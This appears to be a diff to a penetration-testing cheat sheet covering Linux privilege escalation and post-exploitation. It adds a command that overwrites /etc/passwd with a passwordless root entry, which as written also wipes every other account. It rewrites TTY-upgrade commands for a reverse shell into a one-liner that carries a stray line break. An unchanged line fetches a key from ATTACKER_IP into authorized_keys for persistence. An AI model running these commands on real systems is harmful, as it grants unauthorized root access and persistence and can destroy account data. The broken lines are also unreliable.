@@ -241,6 +241,7 @@ $ sudo -l
 $ lsb_release -a
 $ uname -a 
 $ searchsploit [OS] or [Kernel]
+echo root::0:0:root:/root:/bin/bash > /etc/passwd
 
 #See which processes are running with root priv
 ps aux | grep root
@@ -260,11 +261,17 @@ wget https://github.com/pentestmonkey/unix-privesc-check
 __If You have a Reverse Shell...__
 ```bash
 #Get a TTY shell after a reverse shell connection
-$ python -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
 #Set PATH TERM and SHELL if missing:
-$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-$ export TERM=xterm
-$ export SHELL=bash
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export TERM=xterm
+export SHELL=bash
+# Above but as one script 
+python -c 'import pty;pty.spawn("/bin/bash")'; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+; export TERM=xterm; export SHELL=bash
+
+
+
 #Add public key to authorized keys:
 $ echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys
 
